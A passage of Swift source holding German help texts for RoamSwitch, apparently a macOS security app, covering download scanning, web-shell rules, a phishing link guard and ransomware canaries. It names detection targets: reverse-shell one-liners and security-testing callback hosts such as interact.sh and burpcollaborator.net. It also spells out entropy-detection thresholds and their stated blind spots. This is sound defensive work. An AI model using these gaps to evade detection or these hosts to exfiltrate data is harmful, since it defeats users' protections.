                • Erlaubte Geräte: Die Berechtigung der Positivliste (Schreibgeschützt / Lesen & Schreiben) wird automatisch angewendet, mit einem ClamAV-Scan vor jeder Höherstufung auf Lesen/Schreiben.
                • Infektion: Wird Malware gefunden, wird das Volume automatisch ausgeworfen und ein dringender Alarm gesendet.
                • Neu formatierte Laufwerke: Ändert sich die Volume-UUID, stimmt aber die Hardware-Identität einschließlich Seriennummer überein, bleibt die Genehmigung erhalten (Hersteller-/Produkt-ID allein zählt nie als Übereinstimmung).
                • Umfang: Deckt Datenexfiltration und schädliche Payloads über Speichermedien ab. HID-artige BadUSB-Geräte, die sich als Tastatur ausgeben, werden von feat_usb_keyboard_guard behandelt.
                """,
                recommendation: "Setzen Sie nur USB-Laufwerke, die Sie beruflich nutzen, auf die Positivliste, und bevorzugen Sie auf Macs mit sensiblen Daten die Berechtigung Schreibgeschützt."
            ),
            LocalizedEntry(
                id: "feat_bluetooth_guard",
                title: "Automatisches Ausschalten von Bluetooth in nicht vertrauenswürdigen Netzwerken (Pro)",
                summary: "Beim Beitritt zu einem unterwegs genutzten Netzwerk mit Maximaler Sperre wird Bluetooth automatisch ausgeschaltet, um die Angriffsfläche für ungewollte Kopplungen und BLE-Angriffe zu verringern, und wieder eingeschaltet, sobald Sie in ein vertrauenswürdiges Netzwerk zurückkehren.",
                details: """
                • Werkzeug: macOS bietet keine öffentliche API zum Umschalten der Bluetooth-Energieversorgung, daher nutzt RoamSwitch das quelloffene Homebrew-Tool `blueutil` (`brew install blueutil`). Fehlt es, zeigt das Menü eine Einrichtungsanleitung.
                • Wiederherstellung: Bluetooth wird in einem vertrauenswürdigen Netzwerk nur dann wieder eingeschaltet, wenn es unmittelbar vor dem Ausschalten durch RoamSwitch an war; eine Entscheidung, die Sie selbst unterwegs getroffen haben, wird nicht überschrieben.
                • Standardmäßig deaktiviert: Viele Menschen nutzen in Cafés AirPods und Ähnliches, sodass ein stilles Kappen des Audios unerwünscht wäre. Daher Opt-in.
                • Fehlt blueutil später, tut der Schutz nichts. Das Menü zeigt „blueutil fehlt, daher gestoppt“, und es wird einmal eine Mitteilung gesendet.
                """,
                recommendation: "Wenn Sie unterwegs kein Bluetooth-Zubehör nutzen, aktivieren Sie diese Funktion, um Funk-Scanning und ungewollte Kopplungen zu vermeiden."
            ),
        ]
    }

    // MARK: - Features: malware & web protection

    private static func featuresDeMalware() -> [LocalizedEntry] {
        return [
            LocalizedEntry(
                id: "feat_webmail_download_guard",
                title: "Web- & E-Mail-Schutz (Downloads automatisch scannen & isolieren) (Pro)",
                summary: "Überwacht mit FSEvents Dateien, die aus Browsern, Mail, Slack, Discord u. Ä. gespeichert werden, prüft sie mit einer statischen Signaturprüfung und ClamAV und verschiebt Bedrohungen in die Quarantäne.",
                details: """
                • Überwachte Ordner: Standardmäßig `~/Downloads`, `~/Desktop`, `~/Documents` sowie der Download-Ordner von Mail. Ordner mit „⚙️ Überwachte Ordner verwalten…“ hinzufügen oder entfernen.
                • Download-Quelle: Wird über das von macOS gesetzte erweiterte Attribut `com.apple.quarantine` identifiziert.
                • Zweistufige Prüfung: Eine geräteinterne statische Signaturprüfung (klassische Reverse-Shell-Einzeiler u. Ä.; funktioniert auch ohne ClamAV) plus ein ClamAV-Scan. Ein Treffer der statischen Signatur führt unabhängig vom ClamAV-Ergebnis zur Quarantäne; widerspricht ClamAV, weist die Benachrichtigung auf einen möglichen Fehlalarm hin.
                • Quarantäne: Bedrohungen werden nach `~/Library/Application Support/RoamSwitch/Quarantine/` verschoben (nie gelöscht). Schlägt die Verschiebung fehl, meldet die Benachrichtigung dies und bittet um manuelles Löschen.
                • EICAR-Testdatei: Die harmlose branchenübliche Testsignatur wird weder isoliert noch blockiert und löst keine Benachrichtigung aus; sie wird nur im Benachrichtigungsverlauf vermerkt (feat_notification_history).
                • Erster Ordnerzugriff: Vor der macOS-Berechtigungsabfrage erscheint einmalig ein Hinweis, dass es sich um eine legitime Berechtigung für diese Scan-Funktion handelt.
                • Warnungen zu KI-Modellen im Pickle-Format: siehe feat_ai_model_guard.
                """,
                recommendation: "Installieren und aktivieren Sie ClamAV und fügen Sie individuelle Browser-Download-Ordner den überwachten Ordnern hinzu."
            ),
            LocalizedEntry(
                id: "feat_web_rules",
                title: "Erkennung von Webshells und bösartigem Webcode (PHP / JS / JSP / ASP / .htaccess) (Pro)",
                summary: "Erkennt bösartigen Code in der Webanwendungsschicht (Webshells, verschleierte Injektoren, als Bild getarntes PHP, .htaccess-Missbrauch) mit einer kleinen Regelsprache ohne reguläre Ausdrücke. Entwickler-Webordner werden außerdem täglich und auf Abruf geprüft.",
                details: """
                • Herkunft der Regeln: drei Ebenen: die im Produkt eingebauten Regeln, ein signierter täglicher Feed (nur Empfang; gespeichert unter `~/Library/Application Support/RoamSwitch/web_rules.json`) und eigene Regeln (`~/Library/Application Support/RoamSwitch/rules.d/*.json`). Eigene Regeldateien werden nur gelesen, wenn sie Ihnen oder root gehören und für Gruppe und andere nicht schreibbar sind.
                • Eigene Eingaben prüfen: Das JSON-Schema einer Regeldatei lässt sich in den Einstellungen mit „Schema exportieren“ ausgeben (`~/Library/Application Support/RoamSwitch/web_rules.schema.json`). Geben Sie es in Ihrem Editor an, dann gibt es Schlüsselvervollständigung und Tippfehler-Warnungen. „Regeldatei prüfen …“ zeigt für die gewählte Datei, wie viele Regeln nutzbar sind, die Tippfehler (zu einem unbekannten Schlüssel wird der ähnlichste bekannte vorgeschlagen) und welche bestehenden Regeln sie ersetzen würde. Ersetzt eine eigene Regel mit derselben id eine eingebaute oder Feed-Regel, zeigen die Einstellungen das als Hinweis, nicht als Warnung.
                • Sofort-Erkennung: wird in derselben statischen Prüfung auf Webdateien angewendet, die in den von „Web- und Mail-Schutz“ (feat_webmail_download_guard) überwachten Ordnern gespeichert oder geändert werden. Anders als die Linux-Edition kann sie nicht vor dem Zugriff blockieren; alles wird nachträglich erkannt (EndpointSecurity wird nicht verwendet).
                • Entwickler-Webordner: `~/Sites`, `/Library/WebServer/Documents`, `~/Herd`, `~/Library/Application Support/Herd`, `/Applications/MAMP/htdocs`, `~/Library/Application Support/Local`, `~/Local Sites`, die Ordner der Paket-CVE-Prüfung und die vom Web- und Mail-Schutz überwachten Ordner werden einmal täglich und auf Abruf geprüft. Die tägliche Prüfung betritt weder `node_modules` (Abhängigkeiten) noch `.git` (die Sofort-Erkennung in überwachten Ordnern und eine manuelle Prüfung eines gewählten Ordners prüfen `node_modules` mit). Testordner wie `tests` und `fixtures` unterliegen den Regeln nicht.
                • PHP-Sitzungsordner: Dieselbe Prüfung liest die Dateien mit dem Namen `sess_...` in den PHP-Sitzungsordnern (`session.save_path` in der php.ini von Homebrew, MAMP und Herd; ist nichts angegeben, `/tmp`, `/private/var/tmp` und der temporäre Ordner; MAMPs `tmp/php`). Ein Ordner wird aufgelistet, nie durchlaufen, und Dateien, die nicht mit `sess_` beginnen, werden nicht geöffnet. Eine Sitzungsdatei, die PHP-Code in den upload_progress-Wert mischt, ist critical; eine mit einem PHP-Start-Tag in einem Sitzungswert ist high. Critical kommt in den Quarantänetresor, high wird nur gemeldet.
                • Domain-Prüfung: „Domains prüfen“ in den Einstellungen prüft SPF, DMARC, MTA-STS und den Registrierungsablauf der eingegebenen Domains (bis zu 20) und zeigt CAA und DNSSEC zur Information an. Standardmäßig wird nichts abgefragt, die Prüfung läuft nur, wenn Sie Domains eingeben und die Schaltfläche drücken. Das dig dieses Macs fragt den Resolver nach TXT-, CAA-, DS- und MX-Einträgen, und curl fragt den RDAP-Server der TLD-Registry (nachdem die öffentliche Liste der IANA ohne Domainnamen gelesen wurde) sowie bei Domains mit MX- und `_mta-sts`-TXT-Einträgen den eigenen mta-sts-Host der Domain. Das Ergebnis erscheint nur auf dem Bildschirm, es wird nichts gespeichert oder geplant.
                • Quarantäne: Standardmäßig durchlaufen nur critical-Funde denselben Ablauf wie andere Bedrohungen (Verschieben in den Quarantänetresor; Wiederherstellen oder Löschen unter „Quarantänedateien verwalten“). High-Funde führen nur zu einer Benachrichtigung, dem Hook und einer Liste in den Einstellungen; die Datei wird nicht angefasst (wählbar sind auch „critical und high in Quarantäne“ und „nicht in Quarantäne verschieben“). Medium und low werden nur gemeldet und bleiben im Benachrichtigungsverlauf. Eine Datei, die Sie „ausschließen und wiederherstellen“, wird von den Webregeln nicht erneut erkannt (eine eigene Liste, getrennt von den ClamAV-Ausschlüssen).
                • Hook nach einem Fund: Legen Sie eine ausführbare Datei unter `~/Library/Application Support/RoamSwitch/hooks/post-detection` ab, dann wird sie bei jedem Fund mit JSON auf der Standardeingabe ausgeführt (Voraussetzung: gehört Ihnen oder root, für Gruppe und andere nicht schreibbar, ebenso der übergeordnete Ordner; Abbruch nach 30 Sekunden).
                • Kontomaßnahme (standardmäßig aus): Ist sie in den Einstellungen aktiviert, wird bei einem Fund, dessen Datei in den Quarantänetresor verschoben wurde, die Login-Shell des Dateibesitzers deaktiviert (bei einem belassenen high-Fund oder fehlgeschlagener Quarantäne geschieht nichts). Dafür ist ein Administratorkennwort nötig; angemeldete Benutzer, root und Konten unter UID 501 bleiben unberührt. Die ursprüngliche Shell wird festgehalten und lässt sich in den Einstellungen wiederherstellen.
                • Grenzen: Eine Datei wird bis 64 MB ganz geprüft (eine größere an den ersten und letzten 4 MB, ein Bild nur an den Enden), und da nach festen Wortfolgen gesucht wird, werden z. B. durch das Zusammensetzen von Variablennamen zerteilte Zeichenketten nicht verfolgt.
                """,
                recommendation: "Auf einem Mac mit Entwickler-Webordnern: Pro aktivieren und die Standardeinstellungen beibehalten. Eine Datei, die Sie für einen Fehlalarm halten, können Sie aus dem Quarantänetresor wiederherstellen; sie wird dann nicht erneut erkannt."
            ),
            LocalizedEntry(
                id: "feat_event_forwarding",
                title: "Ereignisweiterleitung (SIEM, Syslog, Webhook) (Pro, standardmäßig aus)",
                summary: "Leitet die von RoamSwitch aufgezeichneten Vorfälle und Benachrichtigungen an Ziele weiter, die Sie selbst eintragen (Syslog, eine JSON-Lines-Datei, ein signierter Webhook). Standardmäßig aus; es wird nichts gesendet.",
                details: """
                • Gesendet wird nur: Hostname, Ereignis-ID, Zeit, Art, Schweregrad, Regel, ergriffene Maßnahme, Prozess-ID und -Name sowie eine Zusammenfassung. Dateiinhalte, der Bildschirm und Eingaben werden nie gesendet. Auf Seiten von RoamSwitch gibt es kein Ziel.
                • Ziele: Syslog (`udp://`, `tcp://`, `tls://`; RFC 5424 oder CEF; TCP und TLS mit Oktettzählung oder Zeilenumbruch), eine JSON-Lines-Datei (0600, nach Größe rotiert), ein signierter Webhook (das in macOS enthaltene curl; Adresse und HMAC-SHA256-Schlüssel liegen im Schlüsselbund und gehen über die Standardeingabe an curl, nicht als Argumente).
                • TLS: Zertifikatskette und Hostname werden geprüft; lässt sich das nicht bestätigen, wird nichts gesendet. Eine private CA kann als PEM-Datei angegeben werden; dann wird nur diese CA anerkannt.
                • Bei Fehlern: Ereignisse für TCP, TLS und Webhook kommen in eine Warteschlange auf der Platte (0600, nach Größe und Alter begrenzt, übersteht Neustarts) und werden mit wachsendem Abstand erneut versucht. UDP und Datei werden nicht wiederholt. Beim Beenden noch nicht gesendete Ereignisse bleiben für die wiederholenden Ziele in der Warteschlange.
                • Schutz: Von Angreifern bestimmbare Zeichenfolgen wie Prozessnamen und Befehlszeilen werden je Format maskiert, Steuerzeichen wie Zeilenumbrüche werden zu `\\xNN`. Gefälschte Datensätze lassen sich so nicht einschleusen.
                • Einstellungen: Menü → Malware-Schutz → „Ereignisweiterleitung (SIEM) …“. „Test senden“ prüft die Ziele vor dem Speichern. Läuft nur, solange eine Pro-Lizenz aktiv ist.
                • Unterschied zur Linux-Edition: Formate, Einstellungen und Wiederholverhalten sind gleich. Die Ziele per Organisationsrichtlinie (Fleet) und die Ablehnung interner Webhook-Adressen der Linux-Edition gibt es auf dem Mac nicht.
                """,
                recommendation: "Aktivieren Sie sie, wenn Sie einen SIEM- oder Syslog-Server haben und Vorfälle auch außerhalb des Geräts aufbewahren möchten. Bei rein privater Nutzung können Sie sie ausgeschaltet lassen."
            ),
            LocalizedEntry(
                id: "feat_ai_model_guard",
                title: "Warnung vor gefährlichem KI-Modellformat (Pickle / PyTorch) beim Download (Pro)",
                summary: "Wird eine `.pkl`- / `.pickle`- / `.pt`-Modelldatei von Hugging Face, Civitai o. Ä. heruntergeladen, warnt RoamSwitch, dass das Pickle-Format beim Laden beliebigen Code ausführen kann, und empfiehlt SafeTensors / GGUF.",
                details: """
                • Erkennung: Prüft die Dateiendung von Downloads in den vom Web- & E-Mail-Schutz überwachten Ordnern (feat_webmail_download_guard).
                • Risiko: Pythons Pickle kann bei der Deserialisierung beliebigen Code ausführen, sodass bereits das Laden eines bösartigen Modells den Mac gefährden kann.
                • Verhalten: Nur eine Warnung; die Datei wird nicht isoliert (ein Treffer von ClamAV oder der statischen Signatur führt weiterhin wie gewohnt zur Quarantäne).
                """,
                recommendation: "Laden Sie keine Pickle-/PyTorch-Modelle aus unbekannten Quellen; nutzen Sie stattdessen `.safetensors`- oder `.gguf`-Modelle."
            ),
            LocalizedEntry(
                id: "feat_quarantine_manager",
                title: "Verwaltung isolierter Dateien (Quarantäne, Wiederherstellen, Löschen, Scan-Ausschlüsse)",
                summary: "Von ClamAV oder der statischen Signaturprüfung markierte Dateien werden nie gelöscht, sondern in der Quarantäne aufbewahrt. Der Quarantäne-Manager zeigt den Grund, stellt am Originalort wieder her, löscht endgültig oder schließt einen Pfad von künftigen Scans aus.",
                details: """
                • Öffnen: „Malware-Schutz (XProtect & ClamAV)“ → ClamAV → „📦 Quarantänedateien verwalten…“ oder unter Web- & E-Mail-Schutz „📦 Quarantäne-Manager öffnen…“.
                • Ort: `~/Library/Application Support/RoamSwitch/Quarantine/`, mit Metadaten zu ursprünglichem Pfad, Bedrohungsname und Zeitpunkt der Quarantäne. Nichts wird entfernt, außer Sie wählen ausdrücklich „Endgültig löschen“.
                • Wiederherstellen: Bringt die Datei an ihren ursprünglichen Ort zurück; nur verwenden, wenn Sie sicher sind, dass sie nicht infiziert ist.
                • Ausschließen & wiederherstellen: Bei einem bestätigten Fehlalarm wird die Datei wiederhergestellt und dieser genaue Pfad von künftigen ClamAV-Scans ausgeschlossen. Ausschlüsse werden im selben Fenster aufgelistet, wo „Ausschluss aufheben“ sie rückgängig macht.
                • Endgültig löschen: Löscht nach einer Bestätigung. Dies kann nicht rückgängig gemacht werden.
                • Das MCP-Tool `get_quarantine_status` listet isolierte Dateien auf.
                """,
                recommendation: "Löschen Sie Dateien, die Sie nicht kennen, und nutzen Sie „Ausschließen & wiederherstellen“ nur bei sicheren Fehlalarmen wie eigenen Skripten oder Entwicklungs-Binärdateien."
            ),
            LocalizedEntry(
                id: "feat_xprotect_file_safety",
                title: "Apple-XProtect-Status & Datei-/App-Sicherheitsprüfung",
                summary: "Zeigt Definitionsversion und Status des in macOS integrierten XProtect-Malware-Schutzes an und prüft eine beliebige Datei oder App auf Notarisierung, Signaturaussteller, Team-ID und das Download-Quarantäne-Attribut. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: „Malware-Schutz (XProtect & ClamAV)“ → „🍏 Apple XProtect“ → „XProtect-Status prüfen…“ / „Datei-/App-Sicherheit prüfen…“.
                • Prüfungen: Von Apple genehmigt (notarisiert/Gatekeeper) oder nicht, Signaturaussteller, Team-ID, das Web-Download-Quarantäne-Attribut (`com.apple.quarantine`) sowie der Pfad.
                • Verwendung: Bestätigen Sie vor dem ersten Öffnen einer App, dass sie von einem legitimen Entwickler signiert und notarisiert wurde.
                """,
                recommendation: "Prüfen Sie Apps unbekannter Herkunft vor dem Start und öffnen Sie nichts, das nicht genehmigt oder signiert ist."
            ),
            LocalizedEntry(
                id: "feat_dns_threat_guard",
                title: "DNS-Bedrohungsschutz (Malware & C2 blockieren) (Pro)",
                summary: "Setzt einen sicheren DNS-Resolver ein (Quad9, Cloudflare, AdGuard, CleanBrowsing), sodass Namensabfragen zu Malware-C2-Servern und Phishing-Seiten bereits auf DNS-Ebene blockiert werden.",
                details: """
                • Anbieter: Quad9 (9.9.9.9 / 149.112.112.112), Cloudflare Security (1.1.1.2 / 1.0.0.2), AdGuard DNS (94.140.14.14 / 94.140.15.15, blockiert zusätzlich Werbung und Tracker), CleanBrowsing Security (185.228.168.9 / 185.228.169.9).
                • Richtlinie: „Nur bei nicht vertrauenswürdigem Wi-Fi (empfohlen)“ oder „Immer auf allen Netzwerken aktiv (inkl. vertrauenswürdig)“.
                • Interna: Der privilegierte Helfer wechselt die DNS-Server des aktiven Netzwerkdienstes und stellt bei Rückkehr in ein vertrauenswürdiges Netzwerk die ursprünglichen DHCP-/manuellen DNS-Einstellungen wieder her.
                • Status: Das Menü zeigt „🟢 Sicheres DNS aktiv“ oder „🏠 Vertrauenswürdiges Netzwerk (Standard-Router-DNS)“ an. Auch ein Punkt der Mac-Sicherheitsprüfung.
                """,
                recommendation: "Um gefälschtes DNS in öffentlichem WLAN (DNS-Hijacking) und bösartige Domains zu vermeiden, beginnen Sie mit Quad9 und der Richtlinie „Nur unterwegs“."
            ),
            LocalizedEntry(
                id: "feat_passive_link_guard",
                title: "Link-Schutz (Phishing-Verbindungen erkennen & blockieren: Systemerweiterung, DoH-fähig, Warnmodus schließt bei Ausfall) (Pro)",
                summary: "Blockiert Verbindungen zu Phishing- und Betrugsseiten direkt auf dem Gerät, für jeden Browser oder jede App, basierend auf einer Bedrohungsliste bekannter Betrugsdomains und Markenimitations-Erkennung. Läuft als Content-Filter-Systemerweiterung, mit einem /etc/hosts-Sinkhole als Notlösung, bis die Erweiterung genehmigt ist.",
                details: """
                • Modi: „Aus“, „Nur warnen (nie blockieren)“ und „Eindeutige Phishing-Seiten automatisch blockieren (empfohlen)“ (Standard). Umschalten unter Malware-Schutz → „Link-Schutz (Phishing-Verbindungserkennung) (Pro)“.
                • Was blockiert wird: Nur eindeutige Fälle, also Domains aus der Bedrohungsliste oder Unicode-Homograph-Imitation einer Marke. Tricks mit Marken in Subdomains, riskante TLDs u. Ä. werden nur als Warnung behandelt. Die Bewertungslogik und die Liste werden mit der Linux-Version geteilt.
                • Systemerweiterung (empfohlen): Die Content-Filter-Systemerweiterung `RoamSwitchLinkFilter` prüft TCP-Verbindungen nach der Namensauflösung. Neben dem vom Betriebssystem aufgelösten Hostnamen liest sie auch den SNI aus dem TLS-ClientHello, sodass sie selbst funktioniert, wenn der Browser eigenes DoH / DoT nutzt. Im Blockiermodus verwirft sie QUIC (UDP 443), bei dem der SNI nicht sichtbar ist, sodass Browser auf TCP zurückfallen. Die erste Nutzung erfordert eine Genehmigung in den Systemeinstellungen.
                • JA3-Fingerabdruck: Bei TLS-Verbindungen, deren SNI gelesen wurde, wird zusätzlich der JA3-Hash des Clients berechnet und mit der JA3-Liste der Bedrohungsliste abgeglichen (JA3 wird niemals allein bei Verbindungen ohne SNI verwendet).
                • Rückmeldeserver für Sicherheitstests: Eine Verbindung zu bekannten Servern wie interact.sh, oast.*, burpcollaborator.net, oastify.com, dnslog.cn oder ceye.io löst nur eine Benachrichtigung aus. Die Verbindung wird in keinem Modus blockiert oder angehalten. Solche Server nutzen Werkzeuge für Sicherheitstests, um zu prüfen, ob ein Angriff gelungen ist.
                • Warnmodus (schließt bei Ausfall): Die betreffende Verbindung wird angehalten, und es erscheinen eine Erlauben/Blockieren-Benachrichtigung sowie ein Fenster im Vordergrund; die Verbindung wird je nach Ihrer Antwort fortgesetzt oder verworfen. Ohne Antwort innerhalb von etwa 8 Sekunden wird die Verbindung blockiert. Dieses Ergebnis wird nicht zwischengespeichert, sodass beim nächsten Versuch erneut gefragt wird. Tatsächlich getroffene Antworten werden gespeichert. Der Warnmodus erfordert die Systemerweiterung.
                • hosts-Notlösung: Solange die Erweiterung nicht aktiv ist, lässt der Blockiermodus den privilegierten Helfer die Domains als `0.0.0.0` in einem verwalteten Abschnitt von `/etc/hosts` eintragen.
                • Bedrohungsliste: Wird einmal täglich rein empfangend abgerufen, ohne Übertragung von Kennungen, und mit einem eigenen Ed25519-Listenschlüssel überprüft (getrennt vom App-Update-Schlüssel). Wird „Auto-Update“ deaktiviert, entsteht kein ausgehender Datenverkehr mehr; die mitgelieferten Daten und die Homograph-Erkennung funktionieren weiterhin.
                • Ohne Pro: Der Modus wird gespeichert, aber nichts wird blockiert.
                • Wartet die Systemerweiterung 10 Minuten auf Freigabe, wird einmal eine Mitteilung gesendet (höchstens alle drei Tage). Währenddessen erhält der Menüeintrag Linkschutz ein 🟡 und „Systemerweiterung wartet auf Freigabe“, und linkGuard in `get_guard_status` ist partial (Grund system_extension_not_approved). In dieser Zeit gilt nur die Liste in /etc/hosts, und Verbindungen von Browsern mit verschlüsseltem DNS (DoH) lassen sich nicht stoppen. Freigabe in den Systemeinstellungen unter Allgemein > Anmeldeobjekte & Erweiterungen.
                """,
                recommendation: "Behalten Sie die Standardeinstellung „Automatisch blockieren“ bei und genehmigen Sie die Systemerweiterung für den zuverlässigsten Schutz. Wird ein internes Tool versehentlich blockiert, nutzen Sie „Einmal erlauben (5 Min.)“ in der Benachrichtigung."
            ),
            LocalizedEntry(
                id: "feat_link_safety_auditor",
                title: "Link-Sicherheitsprüfung (manuell, Zero Telemetry)",
                summary: "Analysiert eine verdächtige URL vor dem Öffnen im Browser vollständig auf dem Gerät und bewertet das Risiko auf einer Skala bis 100 anhand von Unicode-Homographen, Subdomain-Imitation, riskanten TLDs, unverschlüsseltem HTTP, rohen IP-Adressen und mehr. In der kostenlosen Version enthalten.",
                details: """
                • Öffnen: Malware-Schutz → „🔗 Link manuell prüfen…“ oder das MCP-Tool `audit_url_safety`.
                • Entschärfte Adressen: Sie können eine Adresse so einfügen, wie sie in Bedrohungsberichten steht, etwa `hxxps://example[.]com`. Vor der Analyse wird die ursprüngliche Adresse wiederhergestellt.
                • Homographen: Erkennt ähnlich aussehende Zeichen wie kyrillische oder griechische Buchstaben (Punycode / `xn--`).
                • Subdomain-Imitation: Analysiert Strukturen wie `apple.com.login-verify.xyz`, die den Namen einer bekannten Marke einbetten.
                • Riskante TLDs: Zieht Punkte ab für TLDs, die häufig bei Wegwerf-Phishing genutzt werden, etwa `.xyz`, `.top`, `.tk`, `.icu`.
                • Unverschlüsseltes HTTP und rohe IPs: Warnt vor unverschlüsseltem HTTP auf Anmeldeseiten und nackten IP-Adress-URLs.
                • Bedrohungsfeed: Steht der Host (oder eine übergeordnete Domain) im selben Bedrohungsfeed wie beim Link-Schutz, gilt der Link als gefährlich und als einer, den der Link-Schutz sperren würde. Die Prüfung liest nur die Feed-Datei, die schon auf diesem Mac liegt; es wird nichts abgerufen.
                • Vollständig lokal: URLs werden nie an eine externe Analyse-API gesendet, sodass vertrauliche URLs und Tokens nicht durchsickern. Nur beim Auflösen verkürzter URLs (Weiterleitungen verfolgen) wird die URL selbst direkt aufgerufen.
                """,
                recommendation: "Klicken Sie verdächtige Links aus E-Mail oder Chat nicht direkt an; prüfen Sie sie zuerst mit der Link-Sicherheitsprüfung."
            ),
            LocalizedEntry(
                id: "feat_ransomware_canary_guard",
                title: "Ransomware-Köderdatei-Erkennung & autonomer Air-Gap mit Prozess-Einfrieren (Pro)",
                summary: "Platziert versteckte Köderdateien (Canary) in Ihren Benutzerordnern. Wird eine davon geändert, gelöscht oder umbenannt, trennt RoamSwitch sofort automatisch das Netzwerk, stoppt Freigabedienste und pausiert (SIGSTOP) den verdächtigen Prozess.",
                details: """
                • Köderdateien: Vier unter `~/Library/Application Support/RoamSwitch/CanaryGuard/`, dazu versteckte Dateien beginnend mit `.roamswitch_security_canary_do_not_delete` in Dokumente, Schreibtisch, Downloads und Fotos. Der SHA-256-Wert jeder Datei wird als Ausgangswert erfasst.
                • Erkennung: Echtzeit-kqueue-Überwachung plus eine Prüfung alle 60 Sekunden. Eine 10-Sekunden-Karenzzeit pro Datei verhindert die doppelte Bearbeitung eines Ereignisschwalls. Echte Dateien, die innerhalb der letzten 60 Sekunden geändert wurden, werden als möglicherweise betroffen erfasst.
                • Automatische Reaktion: (1) Sperre durch die Anwendungs-Firewall, (2) Air-Gap-Eindämmung (pf blockiert allen Datenverkehr, WLAN-Funk wird ausgeschaltet, feat_airgap_containment), (3) Freigabedienste (SMB / SSH / Bildschirmfreigabe) gestoppt, (4) der verdächtige Prozess wird mit SIGSTOP pausiert statt beendet, (5) dringender Alarm und Notfallfenster im Vordergrund.
                • Warum pausieren statt beenden: Die Netzwerkverbindung ist bereits gekappt, sodass ein pausierter Prozess keinen weiteren Schaden anrichten kann. War es ein Fehlalarm, wird der Prozess beim Aufheben mit SIGCONT fortgesetzt, ohne Datenverlust.
                • Dateien zurückholen: Das Notfallfenster zeigt Links zu No More Ransom und zur Seite der japanischen Polizeibehörde NPA, die kostenlose Entschlüsselungswerkzeuge sammeln, sowie einen QR-Code der ersten Adresse (der Mac kann sie während der Isolierung nicht öffnen). Werkzeuge gibt es nur für einige Familien, deren Funktionsweise analysiert wurde, und RoamSwitch selbst entschlüsselt keine Dateien.
                • Beim Aufheben: Netzwerk und WLAN werden wiederhergestellt, der pausierte Prozess fortgesetzt und manipulierte Köderdateien neu erzeugt.
                • Allgemeine Erkennung (Entropie-Analyse, Pro): erkennt auch Verschlüsselung, die keine Köderdatei berührt, anhand des Inhalts dessen, was in `Documents`, `Desktop`, `Downloads` und `Pictures` geschrieben wird. Eine Datei zählt, wenn ihre Shannon-Entropie über die ganze Datei 7,92 oder mehr beträgt; 20 solcher Dateien innerhalb von 5 Sekunden gelten als Massenverschlüsselungs-Schub. Um Verschlüsselung nur des Dateianfangs oder jedes zweiten Blocks ab 4 KiB zu erfassen, wird zusätzlich jedes 4-KiB-Fenster geprüft: Eine Datei ab 16 KiB mit mindestens zwei Fenstern ab 7,9 zählt ebenfalls. Dateien mit intaktem Header eines Kompressionsformats (ZIP, PDF, JPEG und Ähnliches) werden übersprungen. Die Fensterprüfung gilt nicht für Build-Ausgaben (`.o`, `.a`, `.rlib`, `.rmeta`, `.so`, `.dylib`, `.class`, `.pyc`, `.wasm` und Ähnliches) und nicht für Dateien unter einem Ordner `target`. Für kleinere Blöcke teilt sie die ersten 256 KiB einer Datei außerdem in 256-Byte-Fenster: Eine Datei ab 16 KiB zählt, wenn mindestens acht Blöcke zufällig wirkender Fenster (ab 7,0) 5 bis 30 % der Fenster ausmachen und in einem gleichen Abstand von mindestens vier Fenstern wiederkehren, etwa 256 Bytes in jeweils 2 KiB. Eine Datei, deren zufällig wirkende Fenster nur einen zusammenhängenden Abschnitt bilden, wie komprimierte Daten in einem PDF oder einer Datenbank, zählt nicht. Verschlüsselung von Blöcken von nur 16 Bytes sieht keine der beiden Prüfungen. Um die beiden Fensterprüfungen abzuschalten und die Prüfung der ganzen Datei zu behalten, führen Sie `defaults write com.tetsuharu.RoamSwitch RoamSwitch.RansomwareEntropyWindowRule -bool false` aus. Gemessen: Bei 3.531 echten Dateien in diesen Ordnern gab es keinen zusätzlichen Treffer. Bei der Simulation von Verschlüsselung nur des Anfangs und jedes zweiten Blocks (ab 4 KiB) an 150 echten Dateien erfasste der Wert über die ganze Datei 0 bis 35 %, die Fensterprüfung 100 %. Die 256-Byte-Prüfung hatte bei 1.026.286 gewöhnlichen Dateien eines Macs (Apps, Bibliotheken, Caches, Homebrew, Entwicklungsordner) keinen Treffer und erfasste in einer Simulation, die in 150 echten Dateien je 256 Bytes von 2 KiB durch Zufallsbytes ersetzte, alle 150.
                • Standard: Wird bei erstmaliger Aktivierung von Pro automatisch eingeschaltet. Der Vorfallsverlauf ist über das MCP-Tool `get_canary_status` abrufbar. Testen Sie sicher mit „Ransomware-Abwehr-Simulation (Testmodus)“ im Menü.
                • Wie viele platziert wurden: Der Menüeintrag zeigt „platziert N/M“. Konnte keiner platziert werden, erscheint ⚠️ mit dem Grund. Die Zugangsdaten-Honeytokens funktionieren ebenso und zählen die Gründe fürs Auslassen (eine echte Datei liegt schon dort, ein symbolischer Link im Weg, Schreiben fehlgeschlagen) in `placement` von `get_honeytoken_status`.
                """,
                recommendation: "Lassen Sie diese Funktion aktiviert, um wichtige Daten vor unbekannter Ransomware zu schützen, und löschen Sie die versteckten Köderdateien nicht."
            ),
            LocalizedEntry(
                id: "feat_ransomware_recovery",
                title: "Ransomware-Wiederherstellung (Dateien aus einem Vorab-Snapshot herausholen)",
                summary: "Um den Zustand vor einer Verschlüsselung wiederzuerlangen, erstellt RoamSwitch regelmäßig lokale APFS-Snapshots und kopiert nur die benötigten Dateien an einen anderen Ort. Ihre aktuellen Dateien werden nie überschrieben.",
                details: """
                • Vorab-Snapshots: werden unabhängig von jeder Erkennung standardmäßig alle 6 Stunden erstellt (aus / 1 / 3 / 6 / 12 / 24 Stunden). Ein Snapshot nach einer Erkennung kann bereits verschlüsselte Dateien enthalten.
                • Erkennungs-Snapshots: werden auch beim Auslösen des Köder-Wächters erstellt, können aber verschlüsselte Dateien enthalten und werden nicht als Quelle empfohlen.
                • Aufbewahrungsmodus: Solange ein Erkennungs-Snapshot der neueste ist (bis zu 7 Tage), sind neue Vorab-Snapshots und das Aufräumen älterer pausiert, damit die letzte unverschlüsselte Generation nicht verdrängt wird.
                • Herausholen: Über „Ransomware-Wiederherstellung…“ im Menü werden Dateien oder Ordner aus dem empfohlenen Snapshot (dem neuesten noch vorhandenen Vorab-Snapshot) nach `~/RoamSwitch-Recovered/<Snapshot-ID>/` kopiert. Vorhandene Dateien werden nie überschrieben; ein Zurücksetzen des gesamten Volumes gibt es nicht. Die Wiederherstellung erfolgt immer manuell.
